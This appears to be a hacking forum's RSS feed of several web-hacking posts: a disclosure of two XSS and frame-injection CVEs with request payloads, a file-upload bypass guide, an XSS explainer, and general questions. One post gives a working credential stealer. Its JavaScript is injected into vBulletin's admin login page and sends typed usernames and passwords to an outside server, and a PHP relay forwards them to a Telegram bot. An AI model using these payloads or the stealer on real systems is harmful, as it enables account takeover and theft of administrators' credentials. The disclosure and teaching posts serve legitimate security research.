@@ -1,0 +1,2026 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Web Hacking - 0x00sec - The Home of the Hacker</title>
+    <link>https://d.clarkee.co.uk/c/web-hacking/59</link>
+    <description>Topics in the &#39;Web Hacking&#39; category </description>
+    
+      <lastBuildDate>Wed, 10 Feb 2021 12:41:14 +0000</lastBuildDate>
+      <atom:link href="https://d.clarkee.co.uk/c/web-hacking/59.rss" rel="self" type="application/rss+xml" />
+        <item>
+          <title>Redwood Report2Web CVE-2021-26710 and CVE-2021-26711</title>
+          <dc:creator><![CDATA[vict0ni]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p><a href="https://www.redwood.com/report-distribution">Redwood Report2Web</a> v4.3.4.5 and v4.5.3 are vulnerable to XSS. v4.3.4.5 is also vulnerable to frame injection. These are the vulnerable versions to the best of my knowledge. Both issues seem fixed after v4.6.0.</p>
+<h2>Report2Web Login Panel XSS [CVE-2021-26710]</h2>
+<p>The value of the <code>urll</code> parameter is getting reflected without any sanitization, allowing a remote attacker to inject javascript code to the victim’s browser, by using a simple payload <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>Request:</p>
+<pre><code class="lang-http">GET /r2w/signIn.do?urll=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
+Host: [HOST]
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en,en-US;q=0.7,de;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: JSESSIONID=F291E04B316ED2DF72623ACEA8D952CA; r2wctg=3
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+</code></pre>
+<p>Response:</p>
+<pre><code class="lang-auto">...
+&lt;form name="form" action="signIn.do" method="post" onsubmit="return handleSubmit(this);"&gt;
+ &lt;input type="hidden" name="id" value="" /&gt;
+ &lt;input type="hidden" name="language" value="en" /&gt;
+ &lt;input type="hidden" name="urll" value=""&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;" /&gt;
+ 
+&lt;div class="outer"&gt;
+...
+</code></pre>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6.png" data-download-href="/uploads/short-url/8t11Sgx6Pv9NnVkgdl1GjEXjBpI.png?dl=1" title="xss"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6_2_690x151.png" alt="xss" data-base62-sha1="8t11Sgx6Pv9NnVkgdl1GjEXjBpI" width="690" height="151" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6_2_690x151.png, https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6_2_1035x226.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6_2_1380x302.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6_2_10x10.png"></a></div><p></p>
+<h2>Report2Web Online Help Frame Injection [CVE-2021-26711]</h2>
+<p>The <code>turl</code> parameter takes a local path as input and diplays it’s content inside a frame, e.g. <code>?turl=/local/path/doc.html</code>. Although LFI isn’t possible, you can bypass the protection by using <code>\/hostname.tld</code> which the browser translates to <code>//hostname.tld</code> and then to <code>https://hostname.tld</code>, loading an external resource inside the frame and leading to vulnerabilities like XSS and content injection.</p>
+<p>Request:</p>
+<pre><code class="lang-http">GET /r2w/help/Online_Help/NetHelp/default.htm?turl=\/example.com HTTP/1.1
+Host: [HOST]
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en,en-US;q=0.7,de;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+</code></pre>
+<p>Response:</p>
+<pre><code class="lang-auto">...
+&lt;frame id="right" name="right" title="Topic text" src="\/example.com"&gt;
+...
+</code></pre>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11.png" data-download-href="/uploads/short-url/fMyIeONqJP9hHBsx0tFt1EhBoFr.png?dl=1" title="example"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11_2_690x213.png" alt="example" data-base62-sha1="fMyIeONqJP9hHBsx0tFt1EhBoFr" width="690" height="213" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11_2_690x213.png, https://0x00sec.s3.amazonaws.com/optimized/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11_2_1035x319.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11_2_1380x426.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11_2_10x10.png"></a></div><p></p>
+<hr>
+<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26710" class="onebox" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26710</a><br>
+<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26711" class="onebox" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26711</a></p>
+            <p><small>4 posts - 4 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/redwood-report2web-cve-2021-26710-and-cve-2021-26711/24874">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/redwood-report2web-cve-2021-26710-and-cve-2021-26711/24874</link>
+          <pubDate>Wed, 10 Feb 2021 12:41:14 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-24874</guid>
+          <source url="https://d.clarkee.co.uk/t/redwood-report2web-cve-2021-26710-and-cve-2021-26711/24874.rss">Redwood Report2Web CVE-2021-26710 and CVE-2021-26711</source>
+        </item>
+        <item>
+          <title>[vBulletin]: How to steal vBulletin admins password</title>
+          <dc:creator><![CDATA[0x3D]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Hello,</p>
+<p>if you ever had the access to a server hosting a <strong>vBulletin</strong> forum, you would probably be able to access the admin panel by grabbing the database password from the config files, then change the admin encrypted password by your encrypted password from the database to access the admin panel,  but probably you’ll be out the server pretty soon.</p>
+<p>but there’s a better solution which’s getting the admin plain text password, by a <strong>phishing attack</strong> or stealing his password using <strong>JavaScript</strong>, which I’ll be cover in this topic.</p>
+<p>we could use <strong>PHP</strong> and get the password after the post request but <strong>vBulletin</strong> encrypts the password with <strong>MD5</strong> using <strong>JavaScript</strong> in the Client Side, so we’ll try to grab the password before it gets encrypted.</p>
+<p>the script I’ll be using is:</p>
+<pre><code>function mal()
+{
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", "http://example/admindata.php", true);
+	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+	xhr.send("Data="+document.getElementById("vb_login_username").value + " " + document.getElementById("vb_login_password").value);
+}
+</code></pre>
+<p>the given script grabs the password and sends it to a <strong>PHP</strong> script which then writes it to a file or sends it to you using <strong>telegram</strong> or with email, an example using <strong>telegram API</strong>:</p>
+<pre><code>&lt;?php
+
+if ($_SERVER['REQUEST_METHOD'] == "POST" &amp;&amp; isset($_POST['Data']))
+{
+$token = "YOUR_TOKEN";
+file_get_contents("https://api.telegram.org/bot$token/sendMessage? 
+chat_id=YOUR_CHAT_ID&amp;text=" . urlencode($_POST['Data'])."" );
+}
+else
+    header("Location: https://google.com");
+?&gt;
+</code></pre>
+<p>so now you can upload the <strong>PHP</strong> script on the same server or your server, or you can send the passwords directly from the <strong>JavaScript</strong>.</p>
+<p>now we’ll have to edit the index page and add our <strong>JavaScript</strong> script to it and edit somethings to get everything done.</p>
+<p>the index page is located in: <strong>./core/includes/adminfunctions.php</strong></p>
+<p>add the <strong>javascript</strong> script inside a  tag, and edit this line :</p>
+<pre><code>&lt;input type="submit" class="button" value="  &lt;?php echo 
+$vbphrase['log_in']; ?&gt;  " accesskey="s" tabindex="3" /&gt; 
+</code></pre>
+<p>to:</p>
+<pre><code>&lt;input type="submit" onclick="mal()" class="button" value="  &lt;?php echo 
+$vbphrase['log_in']; ?&gt;  " accesskey="s" tabindex="3" /&gt;
+</code></pre>
+<p>and now wait for admins passwords, that’s it, peace out!</p>
+            <p><small>3 posts - 2 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/vbulletin-how-to-steal-vbulletin-admins-password/22112">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/vbulletin-how-to-steal-vbulletin-admins-password/22112</link>
+          <pubDate>Mon, 06 Jul 2020 14:00:45 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-22112</guid>
+          <source url="https://d.clarkee.co.uk/t/vbulletin-how-to-steal-vbulletin-admins-password/22112.rss">[vBulletin]: How to steal vBulletin admins password</source>
+        </item>
+        <item>
+          <title>TOR, a WAF and luck?</title>
+          <dc:creator><![CDATA[New001]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Hey guys, hope you are doing great <img src="https://0x00sec.org/images/emoji/twitter/slightly_smiling_face.png?v=9" title=":slightly_smiling_face:" class="emoji" alt=":slightly_smiling_face:"><br>
+I am about to set up a domain to use on the Onion network, I already have the domain name and the Apache and database set up.<br>
+<strong>However</strong>, because this is going to be on my own network I want to try to be as safe as possible.<br>
+Measures I’m taking are:</p>
+<p>A Linux OS =&gt; behind a WAF =&gt; on it’s own VLAN =&gt; with VPN (Proton) =&gt; and then Tor.</p>
+<p>That is basically how I picture the setup.<br>
+No dynamic content nor JavaScript will run on the site.<br>
+The intention is to avoid anyone from figuring out where I am, AND to keep the site safe from attacks to the best of my abilities.</p>
+<p>What are your opinion on this?</p>
+<p>Sorry for any spel errors, english is not my language, I checked but you never know.</p>
+<p>Thanks for reading my first post. I appreciated.</p>
+            <p><small>17 posts - 7 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/tor-a-waf-and-luck/21592">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/tor-a-waf-and-luck/21592</link>
+          <pubDate>Thu, 04 Jun 2020 02:24:18 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-21592</guid>
+          <source url="https://d.clarkee.co.uk/t/tor-a-waf-and-luck/21592.rss">TOR, a WAF and luck?</source>
+        </item>
+        <item>
+          <title>Insecure File Upload Vulnerability</title>
+          <dc:creator><![CDATA[Kage]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Alright guys… It has been so long since the last time I’ve written a blog post. So I’d like to apologize for my mistakes in advance.</p>
+<p>Finally being done with finals, I had some time to spend on HackTheBox the other day. I’m not going to name the machine to avoid ruining people’s HTB adventures with spoilers, but I can say the user for the machine was web heavy.</p>
+<blockquote>
+<p>Oh this box is gonna be a breeze.</p>
+</blockquote>
+<p>At least that was my initial thought since my strong side is web. In order to get a shell on the machine, I had to exploit two different web vulnerabilities. The first one, widely known SQL Injection was a breeze. The second one, however, was not as easy as I thought. It was no other than the infamous Insecure File Upload vulnerability. After reading a bunch of tutorials, reference sheets and articles, I want to share what I learned about the particular vulnerability type.</p>
+<p><strong>Disclaimer:</strong> This article is not a HackTheBox machine walkthrough, instead we we’ll be focusing on a vulnerability type that is still seen in wild and in CTFs.</p>
+<p>Let’s dive right in.</p>
+<h3><a name="p-57340-protections-against-file-upload-1" class="anchor" href="https://d.clarkee.co.uk#p-57340-protections-against-file-upload-1"></a>Protections Against File Upload</h3>
+<p>Insecure File Upload vulnerability is basically abusing web application’s file upload functionality to upload a malicious file to the system like a reverse shell. In order for this attack to be impactful, we need a file upload that we can upload malicious files and we should know the location those malicious files are stored. Once accomplished, they can lead to Remote Code Executions.</p>
+<p>Let’s look at the different ways developers try to protect against Insecure File Upload vulnerabilities.</p>
+<h3><a name="p-57340-white-listing-file-extensions-2" class="anchor" href="https://d.clarkee.co.uk#p-57340-white-listing-file-extensions-2"></a>White-Listing File Extensions</h3>
+<p>White-listing is basically checking and making sure the uploaded file’s extension is one of the allowed extension types. However, this approach is not flawless. There are a couple ways a white-list protection can be bypassed.</p>
+<p>Let’s say our super-secure developer coded a file upload and used the following check as a white-list protection.</p>
+<pre data-code-wrap="php"><code class="lang-php">&lt;?php
+    $file = $_FILES['file']['name'];
+    $extension = explode(".", $file)[1];
+    if ($extension == "jpeg" || $extension == "jpg" || $extension == "png") {
+        echo "File Uploaded";
+        // Do the necessary operations
+    } else {
+        echo "Only JPG/JPEG and PNG files are allowed";
+    }
+?&gt;
+</code></pre>
+<p><strong>Note:</strong> Most of the code in this article will be in PHP as it is still the most common language used in CTFs and in the real world. However, the methods described in this article applies to other languages as well.</p>
+<p>This file gets the filename from the user, trust the filename (<em>big mistake),</em> splits the filename from the dots and tries to get the filename. A malicious attacker can easily bypass this check by sending a file called shell.jpg.php . The code would get the filename, split it into  [‘shell’, ‘jpg’, ‘php’], check the element in the first index which is “jpg” and assume it is a safe image file. In reality, we just uploaded a php script that can give us a reverse shell in the target system.</p>
+<p><strong>Is it always this easy?</strong></p>
+<p>HELL NO! Although this is an example that can still be seen in wild, most web applications are more complex than that these days. Web languages and frameworks offer various methods/functions to fight against these types of vulnerabilities and developers are getting smarter everyday but so do the attackers.</p>
+<p>Let’s talk about other ways to bypass the white-list protection. To keep the article brief, I’m not going to include code snippets for all of them but try to imagine the code in the back-end as we go through them.</p>
+<p>Some developers try to check the last extension to prevent the bypass described above. Smarter ones utilize their programming language’s or framework’s <em>trusted</em> functions to check your input’s credibility. Even those <em>trusted</em> functions might not be as trustworthy as they seem. Due to the ways some of them interpret the given string, it is possible to bypass them.</p>
+<pre><code class="lang-auto">shell.php?shell.jpeg
+shell.php%00shell.png
+</code></pre>
+<p>Have a look at the filenames above. In some cases, <em>super secure functions</em> validate these as valid filenames. However, when it comes to calling and using the filename, system’s does not interpret them as those functions. If you are not familiar with C-like programming languages, null-byte (%00) indicates the end of a string. Therefore, some systems interpret that filename as shell.php, again letting us upload a shell.</p>
+<p>This might not always work but null-byte injection is more common than you might think.</p>
+<h3><a name="p-57340-black-listing-file-extensions-3" class="anchor" href="https://d.clarkee.co.uk#p-57340-black-listing-file-extensions-3"></a>Black-Listing File Extensions</h3>
+<p>As an opposite approach to white-listing, black-listing file extensions marks some extensions (like .php, .sh etc.) to prevent a malicious attacker from running code on the servers. If not done correctly, this approach is easier to bypass than white-listing protection.</p>
+<p>If the check in place only checks if the extension is .php, one can easily bypass the check by capitalizing letters like .PhP, or using other valid PHP extensions. There are many extensions you can use to make PHP code work.</p>
+<p>Some of those extensions are:</p>
+<ul>
+<li>.php5</li>
+<li>.pht</li>
+<li>.phar</li>
+</ul>
+<p>More of those can be found in:</p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20PHP" rel="noopener nofollow ugc">swisskyrepo/PayloadsAllTheThings</a></p>
+<h3><a name="p-57340-content-type-validation-4" class="anchor" href="https://d.clarkee.co.uk#p-57340-content-type-validation-4"></a>Content-Type Validation</h3>
+<p>Another primitive check employed by developers is checking the content-type sent by the request to make sure it is an expected file-type. What they fail to realize is that just like every other field in a HTTP request, content-type can be modified by the user.</p>
+<p><img src="https://d.clarkee.co.uk/images/transparent.png" alt="Screen_Shot_2020-05-25_at_3.38.42_PM" data-orig-src="upload://cm2pY9vQe1XMc7dJefg68375BVN.png" width="517" height="177"></p>
+<p>A normal request to upload php code to the site.</p>
+<p>This request can be modified to look like the following picture to avoid some server-side protection against file upload.</p>
+<p><img src="https://d.clarkee.co.uk/images/transparent.png" alt="Screen_Shot_2020-05-25_at_3.40.07_PM" data-orig-src="upload://4pfAEMXjVyHUKsRroSqt131AkRW.png" width="517" height="53"></p>
+<p>If the developer only checks the type using the user supplied Content-Type header, it is awfully easy to bypass this check.</p>
+<h3><a name="p-57340-content-length-validation-5" class="anchor" href="https://d.clarkee.co.uk#p-57340-content-length-validation-5"></a>Content-Length Validation</h3>
+<p>This is not a check I’ve run into in the wild or in the CTFs to I won’t dive into this bypass deeply. Having said that some resource state that there are applications that checks the content length to try and understand if the image file uploaded has a length that is more than usual.</p>
+<p>Some of these checks can be bypassed changing the Content-Length header or embedding as short commands as possible. Instead of embedding a full-blown reverse shell like in the above image, the attacker can just embed commands one by one to gain RCE.</p>
+<p>In my experience, it might be useful to embed the code in advance instead of changing the contents of the file in Burp Intercept, especially in CTFs. In some cases, applications check if the length of the content you’ve uploaded corresponds to the length in Content-Length header. So if you change the contents of the file when intercepted, the application might be able to detect that unless you change the Content-Length header too. This is particularly a good tip for the last, but certainly not least type of bypass that will be mentioned in this article.</p>
+<h3><a name="p-57340-magic-bytes-validation-6" class="anchor" href="https://d.clarkee.co.uk#p-57340-magic-bytes-validation-6"></a>Magic Bytes Validation</h3>
+<p>Let’s get into more fun stuff. As hackers come up with creative ways to break security mechanism, developers keep coming up with smarter code. Early on, we talked about a very primitive way to bypass server-side file upload protection: changing Content-Type header. Obviously, developers had to come up with a better approach to check the file type. One approach proposed is checking the magic bytes of files. Every file includes a couple bytes called magic bytes as the first bytes to identify the filetype. This is not dependent on file extension. You cannot change the magic bytes by just changing the filetype. Security mechanisms tend to check these bytes to validate the type of file. However, these bytes can easily be manipulated by the user.</p>
+<pre><code class="lang-auto">GIF89a;
+</code></pre>
+<p>Sometimes adding the string seen above at the beginning of a file is enough to trick applications to interpret the file as a GIF file.</p>
+<p>Another method I prefer is embedding the malicious code directly into a PNG/JPEG file. This is as easy as copying the code and pasting it somewhere in the PNG file (except for the beginning). Once done, you can check the file type using the following command in UNIX based systems.</p>
+<p><img src="https://d.clarkee.co.uk/images/transparent.png" alt="Screen_Shot_2020-05-25_at_4.06.25_PM" data-orig-src="upload://9Ec133NNzWfMiwDIrs4paR1XWVs.png" width="690" height="359"></p>
+<p>In order to get RCE with this method, you have to find a way to send the file with the relevant file extension (.php in this case). If the system successfully prevents you from uploading files with that file extension, you can’t run it once it is on the system. There are some examples, however, that let’s user get a working shell by sending files with double extensions such as reverse-shell.php.jpeg.</p>
+<h3><a name="p-57340-future-work-7" class="anchor" href="https://d.clarkee.co.uk#p-57340-future-work-7"></a>Future Work</h3>
+<p>Insecure File Uploads are not necessarily my strongest web vulnerability but I find the bypasses above interesting and the results can be devastating. While working on the HTB machine I mentioned before, I realized there is no de-facto tool to automatize insecure file upload tests. My next goal is writing a tool that can check such vulnerabilities automatically. This would be something like SQLMap but for file uploads. If you have ideas and want to help or if you already know a tool that can do this with high success rates, reach out to me.</p>
+<h3><a name="p-57340-more-to-read-8" class="anchor" href="https://d.clarkee.co.uk#p-57340-more-to-read-8"></a>More To Read</h3>
+<p>In this section, I’ll include some more links to read more about Insecure File Uploads and to practice exploiting them.</p>
+<ul>
+<li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" rel="noopener nofollow ugc">OWASP Unrestricted File Upload</a></li>
+<li><a href="https://0x00sec.org/t/unrestricted-cv-file-upload/20325" rel="noopener nofollow ugc">Vict0ni’s 0x00sec Post (Vulnerability He Found in the Wild)</a></li>
+</ul>
+<p>Please let me know if you have any suggestions or feedback.</p>
+            <p><small>9 posts - 7 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/insecure-file-upload-vulnerability/21448">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/insecure-file-upload-vulnerability/21448</link>
+          <pubDate>Mon, 25 May 2020 23:45:45 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-21448</guid>
+          <source url="https://d.clarkee.co.uk/t/insecure-file-upload-vulnerability/21448.rss">Insecure File Upload Vulnerability</source>
+        </item>
+        <item>
+          <title>Suggestions for things to try on web app pentest exercise with limited avenues for attack?</title>
+          <dc:creator><![CDATA[OnFOOFian]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Hello all. First post here, hoping it is appropriate to this forum.</p>
+<p>I am working on a web app pen test which is just a simple user login. I have one user account, and the “goal” is to try and gain access to a different users account, for which I have the username.</p>
+<p>The web app is very simple. No javascript, super basic CSS. two form fields for login sent via POST, neither are injectable (I’ve done a ton of manual testing, and used sqlmap a bunch of times with different options).</p>
+<p>One GET request for logout, no parameters. No form fields after logging in. No information leaked via directories or files made available when they shouldn’t be, no errors in misconfiguration, nothing so obvious.</p>
+<p>There is one session cookie set which is a 10 digit random number. I have been thinking this is the avenue of attack, assuming it might store and load sessions from a table, but everything I have tried to inject just gets ignored by the server. No response to attempting time delays, no error responses, nothing, and sqlmap also doesn’t find anything when testing the cookie paramter.</p>
+<p>Stuff like XSS, CSRF etc isn’t relevant at the moment.</p>
+<p>So, suggestions for what I can try? I feel like I’ve tried everything. There must be more to try but I am at the limits of my knowledge. Can anyone give me some suggestions for more techniques I can read up on and start to attempt?</p>
+            <p><small>11 posts - 5 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/suggestions-for-things-to-try-on-web-app-pentest-exercise-with-limited-avenues-for-attack/20085">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/suggestions-for-things-to-try-on-web-app-pentest-exercise-with-limited-avenues-for-attack/20085</link>
+          <pubDate>Fri, 27 Mar 2020 05:55:02 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-20085</guid>
+          <source url="https://d.clarkee.co.uk/t/suggestions-for-things-to-try-on-web-app-pentest-exercise-with-limited-avenues-for-attack/20085.rss">Suggestions for things to try on web app pentest exercise with limited avenues for attack?</source>
+        </item>
+        <item>
+          <title>Practical Applications of XSS</title>
+          <dc:creator><![CDATA[Ph03n1x_Crus4d3r]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <h1>Practical Applications of Cross Site Scripting (XSS)</h1>
+<h1>Prerequisites</h1>
+<p>Throughout this paper, many scripting languages will be used to provide proof-of-concept and other examples for the benefit of the reader. A basic understanding of these languages is required in order to completely understand the concepts that are conveyed herein; that being said, a lack of knowledge in these areas should not deter you from reading on. The information contained within this document can, at least, provide you with a basic understanding of impacts of XSS attacks.</p>
+<pre><code class="lang-auto">here is some  
+code  
+is it all on one line?  
+</code></pre>
+<h2>Terms of Use</h2>
+<p>By reading this document, you agree to the following terms:<br>
+I. I honestly could care less what you do with this info, but for my legal sanity, don’t do anything illegal.</p>
+<p>II. You will hold neither this paper’s author nor its distributors liable for any actions taken that pertain to the information addressed in this document.</p>
+<h1>Introduction</h1>
+<h2>Definition</h2>
+<p>Cross site scripting, commonly known by its acronym, XSS, is a type of computer security vulnerability that involves the injection of code into web pages by means of web applications. During the execution of an XSS attack, information from one entity, where it is not trusted, is transferred to another entity, where it is trusted. The transferred information may be comprised of session data, sensitive page content, compromising user data, or a variety of other objects.</p>
+<h2>History</h2>
+<p>Cross site scripting has existed since Netscape introduced the JavaScript language in the early 1990s. In fact, Netscape was at least moderately aware of the security risks associated with allowing a web server to send executable code to a browser (even if only in a browser sandbox). In some instances, a script from one page should be allowed to access data from another page or object, but in others, this should be strictly forbidden, as a malicious website could attempt to steal sensitive information this way. For this reason, the Same Origin Policy was introduced.</p>
+<h2>Same Origin Policy</h2>
+<p>Essentially, the Same Origin Policy allows any interaction between objects and pages, as long as those objects and/or pages are using the same domain name, application layer protocol, and, in most browsers, TCP port of the web page running the script. This way, a malicious website wouldn’t be able to access sensitive data in another browser.</p>
+<p>Since the implementation of the Same Origin Policy, other access control policies have been integrated within browsers and client-side scripting languages to protect users from malicious attacks. Cross Site Scripting holes can be seen as vulnerabilities that allow attackers to bypass these mechanisms.</p>
+<h1>First Order</h1>
+<p>This vulnerability arises when data is submitted to a web application by a user, then stored nonpersistently, and later reflected back and displayed to the user who issued the request. Typically, the application accepts a parameter containing user-supplied data and simply renders that data back to the user in its response without proper filtration or sanitization.</p>
+<p>First Order XSS bugs account for approximately 75% of all Cross Site Scripting vulnerabilities encountered on the internet. The term First Order XSS is used because this type of attack introduces a payload that is delivered and executed by means of a single request and response.</p>
+<h2>Discovery</h2>
+<p>The most effective approach to detecting first order XSS vulnerabilities is as follows:<br>
+Choose a web application target</p>
+<ol>
+<li>Create a unique arbitrary string that does not appear similar to any data on the web site of the web application target. The string you decide to use should only contain alphabetic characters, to avoid any existing filtration and sanitization methods.</li>
+<li>Submit the string to the application in each parameter individually, until every parameter has been targeted.<br>
+3, Review the application’s response to each request and annotate any instances of the arbitrary string that were returned.</li>
+<li>Use the methods described in the next sections to test for Cross Site Scripting vulnerabilities in the parameters that correspond to the instances you recorded.</li>
+<li>Repeat steps one through five to test other applications on the target web site.</li>
+</ol>
+<h2>Exploitation</h2>
+<p>The purpose of this sub-section is to provide an aid in understanding Cross Site Scripting exploitation through real-world examples of XSS attacks. Each of the examples below is designed to emulate a commonly encountered attack scenario on the web.</p>
+<h2>Virtual Defacement</h2>
+<p>This type of First Order XSS attack involves injecting a maliciously crafted string into a vulnerable application, which has the ability to alter the contents of a page on the client-side, creating a virtual mask over the actual contents that the server sends to the browser</p>
+<p>Virtual Defacement attacks usually require users to take some sort of action. This may simply involve clicking a link that injects malicious data into a page of a target website, or visiting a malicious website that redirects visitors to a target website, sending nefarious code with the request.</p>
+<h3>Example No. One</h3>
+<p><strong>Target</strong> - <a href="http://www.fakenationalnews.com/" rel="nofollow noopener">http://www.fakenationalnews.com/</a><br>
+<strong>Intention</strong> - Mass Hysteria/Panic</p>
+<p>In society, we are constantly flooded with images and messages from the media. This includes, but is not limited to, movies, books, television, newspapers, advertisements and the internet. The topics presented by the media have a substantial influence on how we live our lives. This makes Virtual Defacement a very powerful and imaginably desolating tool. What would happen if a person with villainous intentions found a means to change the content displayed by a popular news website to comply with those villainous intentions. The affects of his doing so could cause people to panic, and could even generate consequences that would take years to<br>
+repair.</p>
+<p>An attacker could:</p>
+<ul>
+<li>Set up a website that contains information on the devious topic of his choosing along with crafted reference links to the Fake National News website.</li>
+<li>Send an email out that contains information on the topic and a link to the Fake National News.</li>
+<li>Post the link on a widely used forum.</li>
+</ul>
+<p>The link to the news website could be manipulated to incorporate XSS attacks designed to allow the attacker to virtually deface the website. Upon clicking the link, the code would be sent as a request to a vulnerable application on the Fake National News server.</p>
+<p>The source of the iframe is directed to a page on the attacker’s website, which is an altered version of the content found on the actual news site. The iframe would cover the entire Fake National News website, so any viewing users would be reading the nefarious content that was set up by the attacker.</p>
+<p>An image tag is used to inject JavaScript that would temporarily (nonpersistently) rewrite the site content that the user requested to view. An example of the fake site content is as follows:</p>
+<h3>Example No. Two</h3>
+<p><strong>Target</strong> - <a href="http://www.fakestockstrading.com/" rel="nofollow noopener">http://www.fakestockstrading.com/</a><br>
+<strong>Intention</strong> - Financial Gain and Mass Hysteria</p>
+<p>In addition to causing mass panic, an attacker could also use a Virtual Defacement attack payload for financial gain. Causing a user to visit a stock trading website that has been virtually defaced might cause that user to make a poor decision that would benefit the attacker, such as selling stocks when it would be more appropriate to buy more of the same stock. The attacker may have crafted code to show an exponential decline in stock value, causing other users to sell their stocks at low prices, and then could purchase them himself at a much lower rate than the rate originally set.</p>
+<h2>Session Hijacking</h2>
+<p>This XSS attack is more commonly used by attackers than any other type of XSS exploitation technique. It involves injecting specifically constructed code that enables an attacker to request user session data via a vulnerable application. The injected code then issues a response, passing the requested data to an external malicious website to be logged.</p>
+<p>Depending on the target website, the target application, the target audience of users, and an assortment of other factors, minor to moderate levels of social engineering are required to successfully execute this type of attack. The tactics used range from posting manipulated external links along with controversial information on public discussion forums, drawing out curious netizens, to creating elaborate email scams that appear to come from a trusted source.</p>
+<h3>Example No. One</h3>
+<p><strong>Target</strong> - <a href="http://www.fakebank.com" rel="nofollow noopener">http://www.fakebank.com</a><br>
+<strong>Intention</strong> - Financial Gain</p>
